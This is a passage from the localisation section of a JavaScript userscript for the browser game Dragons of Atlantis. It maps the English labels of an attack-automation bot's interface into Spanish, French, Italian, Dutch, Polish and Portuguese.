	'Maximum simultaneous marches':'Máximo de Marchas Simultáneas',
	'miles':'millas',
	'Minutes':'Minuto(s)',
	'No targets or troops available':'Sin objetivos o tropas disponibles',
	'No troops available':'No hay suficientes tropas',
	'No Troops Defined':'No Hay Tropas Definidas',
	'Not enough':'No hay suficiente',
	'Not':'No',
	'of inactivity':'de inactividad',
	'of':'de',
	'Opening the map on the last position':'Abriendo el mapa en la última posición',
	'Options':'Opciones',
	'water_dragon outpost':'Ciudad del Agua',
	'stone_dragon outpost':'Ciudad de la Piedra',
	'fire_dragon outpost':'Ciudad del Fuego',
	'wind_dragon outpost':'Ciudad del Viento',
	'ice_dragon outpost':'Ciudad de Hielo',
	'spectral_dragon outpost':'Ciudad Espectral',
	'Permanent Data':'Datos Permanentes',
	'Please wait':'Por favor, espere',
	'Preparing Attack':'Preparando el Ataque',
	'Refresh':'Actualizar',
	'Researching':'Investigando',
	'Retry in':'Reintentando en',
	'Run Time':'Tiempo de Ejecucción',
	's':'s',
	'Safe Mode':'Modo Seguro',
	'Scanning Map':'Buscando datos en $NUM$ millas a la redonda<BR>Este proceso puede demorar un tiempo',
	'Script Options':'Opciones del Script',
	'Search Radius':'Radio de Busqueda',
	'Second value must be at least':'El segundo valor debe ser por lo menos de',
	'Seconds':'Segundo(s)',
	'Send Dragon every certain number of waves':'Enviar Dragón cada cierto número de oleadas',
	'Start Date':'Fecha de Inicio',
	'Starting soon':'Comenzando pronto',
	'Stop if any troops lost':'Detener ataques si se pierden tropas',
	'Successfully':'Exitosamente',
	'Summary':'Detalles',
	'Targets':'Objetivos',
	'Task Completed':'Tarea Finalizada',
	'Tasks':'Tareas',
	'Too many errors, disabling auto training':'Demasiados errores, Desactivado Adiestramientos',
	'Too many requests':'Demasiadas Solicitudes',
	'Too many troops for muster point level':'Demasiadas tropas para el Nivel actual del Punto de Encuentro',
	'Training Configuration':'Configuración de Adiestramientos',
	'Training queue':'Encolando Adistramientos',
	'Troops for Wave Attack':'Tropas para Ataques Masivos',
	'Troops lost':'¡Se han perdido tropas',
	'Troops Not Defined':'No Hay Tropas Definidas',
	'Use the Levels Tab to select attack areas':'Usar la solapa de Niveles para seleccionar el rango de ataque',
	'Userset maximum marches reached':'Llegaste al limite defindo por ti de marchas',    
	'Verbose Log':'Registro Detallado',
	'Verbose logging':'Registro detallado',
	'Verbose':'Detallado',
	'waiting':'esperando',
	'Warnings':'Advertencias',
	'Wave attack to':'Ataque en Oleada a',
	'Wave':'Oleadas',
	'Window drag':'Arrastrar la ventana',
	'Withdraw troops if they are encamped':'Retirar tropas de terrenos conquistados',
	'~AquaTroop':'Tritón',			/* Abbreviation (max. 8 characters) */
	'~ArmoredTransport':'TransB',	/* Abbreviation (max. 8 characters) */
	'~BattleDragon':'DrgComb',		/* idem as above */
	'~Conscript':'Reclu',			/* idem above */
	'~FireDragon':'DrgFueg',		/* idem */
	'~FireMirror':'Espejo',			/* idem */
	'~FireTroop':'Magma',			/* idem */
	'~Giant':'Gigante',				/* idem */
	'~GreatDragon':'GranDrg',		/* idem */
	'~Halberdsman':'Alabar',		/* idem */
	'~IceDragon':'DrgHielo',		/* idem */
	'~Longbowman':'Arq',			/* idem */
	'~Minotaur':'Mino',				/* idem */
	'~PackDragon':'DrgCarg',		/* idem */ 
	'~Porter':'Porteador',			/* idem */
	'~Spy':'Espía',					/* idem */
	'~StoneDragon':'DrgPét',		/* idem */
	'~StoneTroop':'Ogro',			/* idem */
	'~SwiftStrikeDragon':'DrgARap',	/* idem */
	'~WaterDragon':'DrgAgua',		/* idem */
	'~WindDragon':'DrgViet',		/* idem */
	'~WindTroop':'Bansh',			/* idem */
	'~Zzz':'Zzz'
	};
	break;
	/**********************************************************************
	     Français  (by Randalph)
	***********************************************************************/
case 'fr':
	LANG_OBJECT = {
	'above the first value':'supérieure à la premiere',
	'Action Logs':'Logs Actions',
	'Actions':'Actions',
	'and':'et',
	'at':'à',
	'Attack One Target in Waves':'Attaquer une cible par vagues',
	'Attack sent to':'Attaque envoyée vers',
	'Attacking':'Attaquer',
	'Attacks Configuration':'Configuration',
	'Attacks Stats':'Stats',
	'Attacks stopped momentarily to prevent server blocking':'Attaques arrêtées momentanément pour éviter le blocage du serveur',
	'Attacks':'Attaques',
	'Attacks':'Attaques',
	'Auto Refresh every':'Rafraichir toutes les',
	'Automatically':'Automatique',
	'Awaiting task completion notification':'En attente de la notification de fin des tâches',
	'Bandwidth Limit Exceeded':'Limite la largeur de bande Dépassement',
	'Building':'Bâtiment',
	'Busy':'Occupé',
	'by':'par',
	'Charging':'Chargement',
	'Cities': 'Villes',
	'Clear last attack on all maps':'Réinitialiser toutes les cartes',
	'Clear last attack on current map':'Réinitialiser les attaques sur la carte',
	'Config':'Config',
	'Coordinates':'Coordonnées',
	'd':'j', /*abbr Day*/
	'Days':'Jours',
	'Delay Between Attacks':'Délai entre les attaques',
	'Depending on available population':' Population Minimum',
	'Depending on available resources':' Niveaux de Ressources Minimum',
	'Disabled':'Désactiver',
	'Distance must be between':'La distance doit être comprise entre',
	'Distance':'Distance',
	'Dont flag Wildernesses':'Ne pas occuper les étendues sauvages',
	'Enable':'Activer',
	'Enabled':'Activé',
	'Error':'Erreur',
	'First value must be between':'La valeur du délai doit être comprise entre',
	'Full':'Complet',
	'Game Options':'Options de jeu',
	'Going to the coords':'Aller aux coordonnées',
	'h':'h', /*abbr Hour*/
	'Hiding':'Cacher',
	'Hour':'Heure',
	'Hours':'Heures',
	'Info':'Infos',
	'Invalid Date From':'Date non valide de',
	'Invalid Date To':'Date non valide pour',
	'Invalid delays':'Délai invalide',
	'Invalid number of troops':'Nombre d\'unités invalide',
	'Invalid Range Date':'Format de la date incorrect',
	'Last Attack':'Dernière attaque',
	'Loaded':'Script chargé',
	'Logs':'Journal',
	'm':'m', /*abbr Minute*/
	'Manual attack sent to':'Attaque manuelle vers',
	'Maximum simultaneous marches':'Maximum de marches simultanées',
	'miles':'miles',
	'Minutes':'Minutes',
	'No targets or troops available':'Aucune cibles ou troupes disponibles',
	'No troops available':'Pas de troupes disponibles',
	'No Troops Defined':'Pas de troupes définies',
	'Not enough':'Pas assez',
	'Not':'Non',
	'of inactivity':'d\'inactivitées',
	'of':'des',
	'Opening the map on the last position':'Ouvre la carte aux dernières coordonnées',
	'Options':'Options',
	'water_dragon outpost':'Water OutPost',
	'stone_dragon outpost':'Stone Outpost',
	'fire_dragon outpost':'Fire Outpost',
	'wind_dragon outpost':'Wind Outpost',
	'ice_dragon outpost':'Ice Outpost',
	'swamp_dragon outpost':'Temple Immergé',
	'forest_dragon outpost':'Gaïa',
	'desert_dragon outpost':'Place des Dunes',
	'chrono_dragon outpost':'Falaises du Temps',
	'spectral_dragon outpost': 'Spectral Ruins',
	'Permanent Data':'Données en cache',
	'Please wait':'S\'il vous plaît attendre',
	'Preparing Attack':'Préparation d\'attaque',
	'Refresh':'Actualiser',
	'Researching':'Recherche en cours',
	'Retry in':'nouvel essai dans',
	'Run Time':'Temps d\'exécution',
	's':'s', /*abbr Seconds*/
	'Safe Mode':'Mode Sans échec',
	'Scanning Map':'Balayage de la carte sur $NUM$ miles.<BR>Attendez la fin du scan, ne quittez pas la page',
	'Script Options':'Options de script',
	'Search Radius':'Rayon de balayage',
	'Second value must be at least':'La deuxième valeur doit être au moins',
	'Seconds':'Secondes',
	'Send Dragon every certain number of waves':'Choisir l\'ordre de marche des grands dragons',
	'spectral_dragon outpost':'Spectral Outpost',
	'Start Date':'Date de début',
	'Starting soon':'Démarrage dès',
	'Stop if any troops lost':'Désactiver en cas de pertes',
	'Successfully':'Réussi',
	'Summary':'Général',
	'Targets':'Cibles',
	'Task Completed':'Tache terminée',
	'Tasks':'Taches',
	'Too many errors,  disabling auto train':'Trop d\'erreurs, entrainement automatique désactivé',
	'Too many requests':'Trop d\' demandes',
	'Too many troops for muster point level':'Déploiement maximal atteint',
	'Training Configuration':'Configuration',
	'Training queue':'File de formation en attente',
	'Troops for Wave Attack':'Sélectionnez vos troupes',
	'Troops lost':'Troupes perdues',
	'Troops Not Defined':'Aucunes troupes définies',
	'Use the Levels Tab to select attack areas':'Utilisez l\'onglet "Niveaux" et sélectionnez la cible',
	'Userset maximum marches reached':'Maximum de marches simultanés atteinte',
	'Verbose logging':'Journal d\'évenements',
	'Verbose Logs':'Détail Logs',
	'Verbose':'Détail',
	'waiting':'en attente',
	'Warnings':'Avertissements',
	'Wave attack to':'Attaque en vagues vers',
	'Wave':'Vagues',
	'Window drag':'Glisser/déposer',
	'Withdraw troops if they are encamped':'Retirer les troupes en campement',
	'~AquaTroop':'SolAqa',        /* Abbreviation (max. 8 characters) */
	'~ArmoredTransport':'Ballons',	/* Abbreviation (max. 8 characters) */
	'~BattleDragon':'DrgGr',		/* idem as above */
	'~Conscript':'Conscrit',		/* idem above */
	'~FireDragon':'DrgFeu',			/* idem */
	'~FireMirror':'Miroir',			/* idem */
	'~FireTroop':'Magma',			/* idem */
	'~IceTroop':'FchAme',			/* idem */
	'~ForestTroop':'Titan',			/* idem */
	'~DesertTroop':'March',			/* idem */
	'~SwampTroop':'Venon',			/* idem */
	'~FrostGiant':'GeaGla',			/* idem */
	'~Giant':'Géant',				/* idem */
	'~GreatDragon':'GrdDrg',		/* idem */
	'~Halberdsman':'Halbrd',		/* idem */
	'~IceDragon':'IceDrg',			/* idem */
	'~SwampDragon':'SrpDrg',			/* idem */
	'~ForestDragon':'DrgAmb',			/* idem */
	'~DesertDragon':'Hélio',			/* idem */
	'~ChronoDragon':'Chrono',			/* idem */
	'~Longbowman':'Archer',			/* idem */
	'~Minotaur':'Mino',				/* idem */
	'~PackDragon':'DrgTrsp',   	    /* idem */
	'~Porter':'Porteur',			/* idem */
	'~Spy':'Espion',				/* idem */
	'~StoneDragon':'DrgPierre',		/* idem */
	'~StoneTroop':'Ogre',			/* idem */
	'~SwiftStrikeDragon':'RapDrg',	/* idem */
	'~WaterDragon':'DrgAqua',		/* idem */
	'~WindDragon':'DrgVent',		/* idem */
	'~WindTroop':'Banshee',			/* idem */
	'~LightningCannon':'Canon',
	'~ChargeTroop':'Storm',
	'~VengeWyrm':'Venge',
	'~DimensionalRuiner':'Ravag',
	'~Zzz':'Zzz'
	};
	break;

	/*******************************************************************************
		Italiano (by Boaro and Primate)
	*******************************************************************************/
case 'it':
	LANG_OBJECT = {
	'above the first value':'in più del valore minimo',
	'Action Logs': 'Registro Azioni',
	'Actions': 'Azioni',
	'and': 'e',
	'Are you sure you want to':'Sei sicuro di voler',
	'at': 'a',
	'Attack One Target in Waves': 'Attacco un obiettivo con Ondate',
	'Attack sent to': 'Attacco inviato a',
	'Attacking': 'Attacco in corso',
	'Attacks Configuration': 'Configurazione degli attacchi',
	'Attacks Logs': 'Registro attacchi',
	'Attacks stopped momentarily to prevent server blocking':'Attacchi temporaneamente fermati per prevenire il blocco da parte del server',
	'Attacks': 'Attacchi',
	'Auto Refresh every':'Aggiorna automaticamente ogni',
	'Automatically': 'Automaticamente',
	'Awaiting task completion notification': 'In attesa della notifica di completamento delle attività',
	'Bandwidth Limit Exceeded':'Limite larghezza banda superato',
	'Building': 'Costruendo',
	'Busy': 'Occupato',
	'by': 'da',
	'Charging':'Caricamento',
	'Cities': 'Cittàs',
	'Clear last attack on all maps': 'Cancella l\'ultimo attacco eseguito su tutte le mappe',
	'Clear last attack on current map': 'Cancella l\'ultimo attacco eseguito su questa mappa',
	'Config': 'Configurazione',
	'Coordinates': 'Coordinate',
	'd':'g',
	'Days': 'Giorni',
	'Delay Between Attacks': 'Ritardo tra gli attacchi',
	'Depending on available population': 'Una truppa per città alla volta',
	'Depending on available resources': 'Fino ad esaurimento risorse',
	'Disabled': 'Disabilita',
	'Distance must be between': 'La distanza deve essere tra',
	'Distance': 'Distanza',
	'Dont flag Wildernesses':'Non conquistare i terreni attaccati',
	'Enable': 'Abilita',
	'Enabled': 'Abilitato',
	'Error': 'Errore',
	'First value must be between': 'Il valore minimo deve essere compreso tra',
	'Full': 'Completo',
	'Game Options': 'Opzioni di gioco',
	'Going to the coords':'Stanno andando verso le coordinate designate',
	'h':'o',
	'Hiding': 'Truppe NASCOSTE',
	'Hour': 'Ora',
	'Hours': 'Ore',
	'Info': 'Informazioni',
	'Invalid Date From': 'Data Invalida Da',
	'Invalid Date To': 'Data Invalida fino A',
	'Invalid delays': 'Ritardo non valido',
	'Invalid number of troops': 'Numero di truppe non Valido',
	'Invalid Range Date': 'Frangente di tempo non valido',
	'Last Attack': 'Ultimo attacco',
	'Loaded': 'Caricato',
	'Logs': 'Registri',
	'm':'m',
	'Manual attack sent to': 'Inviato attacco manuale a ',
	'Maximum simultaneous marches': 'Massime Marce simultanee',
	'miles':'chilometri',
	'Minutes': 'Minuti',
	'No Generals Available': 'Nessun generale disponibile',
	'No targets or troops available': 'Nessun obiettivo o truppa disponibile',
	'No troops available': 'Nessuna truppa disponibile',
	'No Troops Defined': 'Nessuna truppa definita',
	'Not enough': 'Non hai abbastanza',
	'Not': 'Non',
	'of inactivity':'di inattività',
	'of': 'di',
	'Opening the map on the last position':'Sto aprendo la mappa all\'ultima posizione',
	'Options': 'Opzioni',
	'water_dragon outpost': 'Avamposto d\'Acqua',
	'stone_dragon outpost': 'Avamposto di Pietra',
	'fire_dragon outpost': 'Avamposto di Fuoco',
	'wind_dragon outpost': 'Avamposto di Vento',
	'ice_dragon outpost': 'Avamposto di Hielo',
	'spectral_dragon outpost': 'Avamposto di Spectral',
	'Permanent Data':'Dati Permanenti',
	'Please wait':'Attendere prego',
	'Preparing Attack':'Sto preparando l\'attacco',
	'Refresh': 'Aggiorna',
	'Researching': 'Sto ricercando',
	'Retry in':'Riprova in',
	'Run Time': 'Esecuzione',
	's':'s',
	'Safe Mode': 'Modalità provvisoria',
	'Scanning Map': 'Scansione della mappa entro $NUM$ chilometri <BR> Richiederà del tempo',
	'Script Options': 'Opzioni Script',
	'Search Radius':'Raggio di ricerca',
	'Second value must be at least':'Il maaggiore deve essere almeno',
	'Seconds': 'Secondi',
	'Send Dragon every certain number of waves':'Invia il Drago una volta ogni tot Onde',
	'spectral_dragon outpost':'Avamposto Fantasma',
	'Start Date': 'Data d\'inizio',
	'Starting soon':'A partire presto',
	'Stop if any troops lost': 'Ferma gli attacchi se muoiono delle truppe',
	'Successfully': 'Successo',
	'Summary': 'Sintesi',
	'Targets': 'Obiettivi',
	'Task Completed': 'Attività Completate',
	'Tasks': 'Attività',
	'Too many errors,  disabling auto train': 'Troppi errori, addestramento automatico fermato',
	'Too many requests':'Troppe richieste',
	'Too many troops for muster point level': 'Il livello del Punto di Raduno non supporta cosi tante truppe',
	'Training Configuration': 'Configurazione Addestramento',
	'Training queue': 'Elenco truppe in addestramento',
	'Troops for Wave Attack': 'Truppe per l\'attacco ad Onda',
	'Troops lost': 'Hai perso delle truppe',
	'Troops Not Defined': 'Truppe Non definite',
	'Use the Levels Tab to select attack areas': 'Usa la scheda Livello per selezionare le aree da attaccare',
	'Userset maximum marches reached': 'Numero massimo di marce raggiunto',
	'Verbose logging': 'Accesso con informazioni',
	'Verbose Logs': 'Registro verboso',
	'Verbose': 'Verboso',
	'waiting': 'sto aspettando',
	'Warnings': 'Avvertenze',
	'Wave attack to': 'Attacco ad Onda verso',
	'Wave': 'Onda',
	'Window drag': 'Trascina la finestra con il mouse',
	'Withdraw troops if they are encamped':'Ritira le truppe se si sono accampate',
	'~AquaTroop':'Abissi',			/* Abbreviation (max. 8 characters) */
	'~ArmoredTransport':'Blindati',	/* Abbreviation (max. 8 characters) */
	'~BattleDragon':'DragoGue',		/* idem as above */
	'~Conscript':'Recluta',			/* idem above */
	'~FireDragon':'DrgFuoco',		/* idem */
	'~FireMirror':'SpecchiF',		/* idem */
	'~FireTroop':'Magma',			/* idem */
	'~Giant':'Giganti',				/* idem */
	'~GreatDragon':'DrgBase',		/* idem */
	'~Halberdsman':'Alabarde',		/* idem */
	'~IceDragon':'IceDrg',			/* idem */
	'~Longbowman':'Arcieri',		/* idem */
	'~Minotaur':'Minotaur',			/* idem */
	'~PackDragon':'DraghiTS',		/* idem */ 
	'~Porter':'Portanti',			/* idem */
	'~Spy':'Spia',					/* idem */
	'~StoneDragon':'DrgPietr',		/* idem */
	'~StoneTroop':'OrcoGran',		/* idem */
	'~SwiftStrikeDragon':'DragoVel',/* idem */
	'~WaterDragon':'DrgAcqua',		/* idem */
	'~WindDragon':'DrgVento',		/* idem */
	'~WindTroop':'Banshee',			/* idem */
	'~Zzz':'Zzz'
	};
	break;
	/*********************************************************************************************
	Nederlands / Dutch  (by Tweakit/Modified by RaBeRa/Corrected by Soho/Additions by Cyrion)
	*********************************************************************************************/
case 'nl':
	LANG_OBJECT = {
	'above the first value':'boven de eerste waarde',
	'Action Logs':'Actie Logs',
	'Actions':'Acties',
	'and':'en',
	'Are you sure you want to':'Weet je zeker dat je',
	'at':'bij',
	'Attack One Target in Waves':'Val één doelwit aan met waves',
	'Attack sent to':'Aanval verzonden naar',
	'Attacking':'Aanvallen',
	'Attacks Configuration':'Aanvals Samenstelling',
	'Attacks Logs':'Aanvallogs',
	'Attacks stopped momentarily to prevent server blocking':'Aanvallen tijdelijk gestopt om server blokkade te voorkomen',
	'Attack':'Aanval',
	'Attacks':'Aanvallen',
	'Auto Refresh every':'automatisch verversen elke',
	'Automatically':'Automatisch',
	'Awaiting task completion notification':'In afwachting van melding taakvoltooiing',
	'Backup':'Backup maken',
	'Bandwidth Limit Exceeded':'Bandbreedte limiet overschreden',
	'Battle Report':'Veldslagrapporten',
	'Building':'Bouw',
	'Busy':'Bezig',
	'by':'door',
	'Charging':'Laden van',
	'Choose':'Kiezen',
	'Cities':'Steden',
	'Clear last attack on all maps':'Wis laatste aanval op alle kaarten',
	'Clear last attack on current map':'Wis laatste aanval op huidige kaart',
	'Config':'Samenstelling',
	'Coordinates':'Coördinaten',
	'd':'d',
	'Days':'Dagen',
	'Delay Between Attacks':'Vertraging tussen aanvallen',
	'Depending on available population':'Afhankelijk van beschikbare bevolking',
	'Depending on available resources':'Afhankelijk van beschikbare grondstoffen',
	'Disabled':'Uitgeschakeld',
	'Distance must be between':'Afstand moet liggen tussen',
	'Distance':'Afstand',
	'Dont flag Wildernesses':'Neem geen wildernissen over',
	'Dragon':'Draak',
	'Enable':'Inschakelen',
	'Enabled':'Ingeschakeld',
	'Error':'Fout',
	'fire_dragon outpost':'Vuur Voorpost',
	'First value must be between':'Eerste waarde moet liggen tussen',
	'Full':'Vol',
	'Game Options':'Spel Opties',
	'Going to the coords':'Gaat naar de coördinaten',
	'h':'u',
	'Hiding':'Verbergen',
	'Hour':'Uur',
	'Hours':'Uur',
	'ice_dragon outpost':'IJs Voorpost',
	'Info':'Info',
	'Invalid Date From':'Ongeldige Datum Vanuit',
	'Invalid Date To':'Ongeldige Datum To',
	'Invalid delays':'Ongeldige vertragingen',
	'Invalid number of troops':'Ongeldig aantal troepen',
	'Invalid Range Date':'Ongeldige Range datum',
	'Language':'Taal',
	'Last Attack':'Laatste Aanval',
	'Level':'Niveau',
	'Loaded':'Geladen',
	'Logs':'Logs',
	'm':'m',
	'Manual attack sent to':'Aanval handmatig verzonden naar',
	'Maximum requests per hour':'Maximum aantal verzoeken per uur',
	'Maximum simultaneous marches':'Maximum gelijktijdige marsen',
	'miles':'mijl',
	'Minutes':'Minuten',
	'Next City':'Volgende stad of voorpost',
	'No targets or troops available':'Geen doelwitten of troepen beschikbaar',
	'No troops available':'Geen troepen beschikbaar',
	'No Troops Defined':'Geen troepen opgegeven',
	'Not enough':'Niet genoeg',
	'Not':'Niet',
	'of inactivity':'van inactiviteit',
	'of':'van',
	'Opening the map on the last position':'Kaart openen op laatste positie',
	'Options':'Opties',
	'Permanent Data':'Vaste gegevens',
	'Please wait':'Even geduld aub',
	'Preparing Attack':'Aanval voorbereiden',
	'Refresh':'Verversen',
	'Researching':'Onderzoek', 
	'Restore':'Backup terugzetten',
	'Retry in':'Opnieuw in',
	'Run Time':'Looptijd',
	's':'s',
	'Safe Mode':'Veilige Modus',
	'Scanning Map':'Scannen kaart binnen $NUM$ mijl <BR> Dit duurt ongeveer',
	'Script Options':'Script opties',
	'Search Radius':'Zoek in straal van',
	'Second value must be at least':'Tweede waarde moet minimaal',
	'Seconds':'Seconden',
	'Send Dragon every certain number of waves':'Stuur Draak elke zoveelste aanval mee',
	'spectral_dragon outpost':'Spook Ruïne',
	'Start Date':'Start datum',
	'Starting soon':'Begint binnenkort',
	'Starting Soon':'Begint binnenkort',
	'stone_dragon outpost':'Steen Voorpost',
	'Stop if any troops lost':'Stop bij verliezen troepen',
	'Successfully':'Succesvol',
	'Summary':'Overzicht',
	'Targets':'Doelwitten',
	'Task Completed':'Taak voltooid',
	'Tasks':'Taken',
	'Toggle Flash':'DoA-Flash aan/uit',
	'Too many errors, disabling auto train':'Te veel fouten, automatisch trainen uitgeschakeld',
	'Too many requests':'Te veel verzoeken',
	'Too many troops for muster point level':'Te veel troepen voor niveau verzamelpunt',
	'Training Configuration':'Instelling trainingen',
	'Training queue':'Wachtrij trainingen',
	'Troops for Wave Attack':'Troepen voor wave-aanval',
	'Troops lost':'Troepen verloren',
	'Troops Not Defined':'Geen troepen opgegeven',
	'Use the Levels Tab to select attack areas':'Gebruik het tabblad Niveaus om de aan te vallen gebieden te selecteren',
	'Userset maximum marches reached':'Maximum aantal marsen bereikt',
	'Verbose logging':'Uitgebreid loggen',
	'Verbose Logs':'Uitgebreide Logs',
	'Verbose':'Uitgebreid',
	'waiting':'wachten',
	'Warnings':'Waarschuwingen',
	'water_dragon outpost':'Water Voorpost',
	'Wave attack to':'Wave-aanval op',
	'Wave Stats':'Wave statistieken',
	'Wave':'Wave',
	'wind_dragon outpost':'Wind Voorpost',
	'Window drag':'Slepen venster',
	'Withdraw troops if they are encamped':'Troepen terugtrekken als deze versterken',
	'Your Player':'Spelergegevens',
	'~AquaTroop':'Visjes',			/* Abbreviation (max. 8 characters) */
	'~ArmoredTransport':'AT\'s',		/* Abbreviation (max. 8 characters) */
	'~BattleDragon':'BD',			/* idem as above */
	'~Conscript':'Rekruut',			/* idem above */
	'~FireDragon':'Vuur Draak',		/* idem */
	'~FireMirror':'Spiegels',		/* idem */
	'~FireTroop':'Pyro',			/* idem */
	'~Giant':'Reus',			/* idem */
	'~GreatDragon':'Grote Draak',		/* idem */
	'~Halberdsman':'Helbaar',		/* idem */
	'~IceDragon':'Vorstdrk',		/* idem */
	'~Longbowman':'LBM',			/* idem */
	'~Minotaur':'Mino',			/* idem */
	'~PackDragon':'TSDraak',		/* idem */
	'~Porter':'Drager',			/* idem */
	'~Spy':'Spion',				/* idem */
	'~StoneDragon':'SteenDraak',		/* idem */
	'~StoneTroop':'Oger',			/* idem */
	'~SwiftStrikeDragon':'SSD',		/* idem */
	'~WaterDragon':'WaterDraak',		/* idem */
	'~WindDragon':'WindDraak',		/* idem */
	'~WindTroop':'Banshee',			/* idem */
	'~Zzz':'Zzz'
	};
	break;
	/*******************************************************************************
		Polish
	*******************************************************************************/
case 'pl':
	LANG_OBJECT = {
	'above the first value':'powyzej pierwszej wartosci',
	'Action Logs':'Dzienniki dzialaniu',
	'Actions':'Akcje',
	'and':'i',
	'Are you sure you want to':'Czy na pewno chcesz',
	'at':'w',
	'Attack One Target in Waves':'Jeden cel ataku w Fala',
	'Attack sent to':'Wyslane do Atak',
	'Attacking':'Atak',
	'Attacks Configuration':'Ataki Konfiguracja',
	'Attacks Logs':'Logi Ataki',
	'Attacks stopped momentarily to prevent server blocking':'Ataki zatrzymal sie na chwile, aby zapobiec blokowaniu serwerów',
	'Attacks':'Ataki',
	'Auto Refresh every':'Automatyczne odswiezanie co',
	'Automatically':'Automatycznie',
	'Awaiting task completion notification':'Oczekiwanie na zakonczenie zadania zgloszeniu',
	'Bandwidth Limit Exceeded':'Przekroczono limit transferu',
	'Building':'Budowanie',
	'Busy':'Zajety',
	'by':'prze',
	'Charging':'Ladowanie',
	'Cities': 'Miasta',
	'Clear last attack on all maps':'Usun ostatnie atak na wszystkich mapach',
	'Clear last attack on current map':'Usun ostatnie atak na aktualna mape',
	'Config':'Konfiguracja',
	'Coordinates':'Wspólrzedne',
	'd':'d',
	'Days':'Dni',
	'Delay Between Attacks':'Przerwa pomiedzy atakami',
	'Depending on available population':'Minimalna Obudowa',
	'Depending on available resources':'Minimalnego poziomu zasobów',
	'Disabled':'Dezaktywowac',
	'Distance must be between':'Odleglosc powinna wynosic od',
	'Distance':'Odleglosc',
	'Dont flag Wildernesses':'Nie nalezy puszczach z terenów zaatakowany',
	'Enable':'Wlac',
	'Enabled':'Wlaczone',
	'Error':'Blad',
	'First value must be between':'Wartosc musi byc pierwsze entre',
	'Full':'Pelny',
	'Game Options':'Opcje gry',
	'Going to the coords':'Przechodzac do wspólrzednych',
	'h':'h',
	'Hiding':'Ukrywanie',
	'Hour':'Godziny',
	'Hours':'Godziny',
	'Info':'Informacje',
	'Invalid Date From':'Nieprawidlowe dane od',
	'Invalid Date To':'Nieprawidlowe dane do',
	'Invalid delays':'Niewazny opóznienia',
	'Invalid number of troops':'Bledna liczba zolnierzy',
	'Invalid Range Date':'Nieprawidlowy zakres dat',
	'Last Attack':'Ostatni atak',
	'Loaded':'Zaladowany',
	'Logs':'Dzienniki',
	'm':'m',
	'Manual attack sent to':'Podrecznik wyslane do ataku',
	'Maximum simultaneous marches':'Maksymalna jednoczesne marsze',
	'miles':'mil',
	'Minutes':'Minut',
	'No targets or troops available':'Nie celów lub dostepnych oddzialów',
	'No troops available':'Wojsko nie jest dostepna',
	'No Troops Defined':'Nie zdefiniowane Troops',
	'Not enough':'A Malo',
	'Not':'Nie',
	'of inactivity':'bezczynnosci',
	'of':'z',
	'Opening the map on the last position':'Otwarcie mapy na ostatniej pozycji',
	'Options':'Opcje',
	'water_dragon outpost':'Water Outpost',
	'stone_dragon outpost':'Stone Outpost',
	'fire_dragon outpost':'Fire Outpost',
	'wind_dragon outpost':'Wind Outpost',
	'ice_dragon outpost':'Ice Outpost',
	'swamp_dragon outpost':'Sunken Temple',
	'spectral_dragon outpost':'Spectral Outpost',
	'Permanent Data':'Stale Danych',
	'Please wait':'Proszę czekać',
	'Preparing Attack':'Przygotowanie Atak',
	'Refresh':'Odswiez',
	'Researching':'Badania',
	'Retry in':'Ponowna próba',
	'Run Time':'Czas pracy',
	's':'s',
	'Safe Mode':'Tryb awaryjny',
	'Scanning Map':'W $NUM$ mil Skanowanie map <BR> powinna to okolo czas',
	'Script Options':'Opcje Script',
	'Search Radius':'OdlegL',
	'Second value must be at least':'Druga wartosc musi wynosic co najmniej',
	'Seconds':'Sekund',
	'Send Dragon every certain number of waves':'Wyslij Smoka co pewnej liczby Fala',
	'spectral_dragon outpost':'Spectral Outpost',
	'Start Date':'Poczatek',
	'Starting soon':'Począwszy od zaraz',
	'Stop if any troops lost':'Stop, jezeli jakiekolwiek wojska stracone',
	'Successfully':'Powodzeniem',
	'Summary':'Podsumowanie',
	'Targets':'Cele',
	'Task Completed':'Adanie Wykonane',
	'Tasks':'Zadania',
	'Too many errors,  disabling auto train':'Byt wiele bledów, wylaczenie pociagu auto',
	'Too many requests':'Byt wielu żądań',
	'Too many troops for muster point level':'Byt wielu zolnierzy zebrac punkt za poziom',
	'Training Configuration':'Konfiguracja Szkolenia',
	'Training queue':'Szkolenia kolejki',
	'Troops for Wave Attack':'Fala Atak wojsk',
	'Troops lost':'Wojsko Stracone',
	'Troops Not Defined':'Wojsko Nie zdefiniowane',
	'Use the Levels Tab to select attack areas':'Uzyciu karty Poziom wybrac obszary atak',
	'Userset maximum marches reached':'Maksymalnie marsze Zasieg UserSet',
	'Verbose logging':'Verbose logging',
	'Verbose Logs':'Dzienniki Konsola',
	'Verbose':'Konsola',
	'waiting':'czeka',
	'Warnings':'Ostrzezenia',
	'Wave attack to':'Atak Fala',
	'Wave':'Fala',
	'Window drag':'Okna przeciagnij',
	'Withdraw troops if they are encamped':'Wycofania wojsk jesli sa one obóz',
	'~Zzz':'Zzz'
	};
	break;
/*******************************************************************************
  [Portugues] (by The MIB)
*******************************************************************************/
case 'pt-br':
case 'pt':
case 'br':
	var translateArray = {
	'above the first value':'acima do primeiro valor',
	'Action Logs':'Logs de ação',
	'Actions':'Ações',
	'and':'e',
	'at':'em',
	'Attack One Target in Waves':'Um ataque de destino em Ondas',
	'Attack sent to':'Ataque enviado para',
	'Attacking':'Atacando',
	'Attacks':'Ataques',
	'Attacks Configuration':'Configuração de Ataques',
	'Attacks Stats':'Estatísticas de Ataques',
	'Attacks stopped momentarily to prevent server blocking':'Ataques pararam momentaneamente para impedir bloqueio do servidor',
	'Attacks':'Ataques',
	'Auto Refresh every':'Auto atualiza a cada',
	'Automatically':'Automaticamente',
	'Awaiting task completion notification':'Aguardando notificação de conclusão da tarefa',
	'Building':'Construir',
	'Busy':'Ocupado',
	'by':'por',
	'Cities': 'Cidades',
	'Clear last attack on all maps':'Limpar último Ataque em todos os mapas',
	'Clear last attack on current map':'Limpar último Ataque no mapa atual',
	'Config':'Configuração',
	'Console Logs':'Console Logs',
	'Console':'Console',
	'Coordinates':'Coordenadas',
	'd':'d', 
	'Days':'Dias',
	'Delay Between Attacks':'Delay entre os ataques',
	'Disabled':'Desabilitado',
	'Distance must be between':'Distância deve estar entre',
	'Distance':'Distância',
	'Dont make Wildernesses of the terrains attacked':'Não faça Wildernesses dos terrenos atacados',
	'Enable':'Ativar',
	'Enabled':'Ativado',
	'Error':'Erro',
	'First value must be between':'Primeiro valor deve estar entre',
	'Full':'Cheio',
	'Game Options':'Opções de Jogo',
	'Going to the coords':'Indo para a coordenada',
	'h':'h',
	'Hiding':'Escondido',
	'Hour':'Hora',
	'Hours':'Horas',
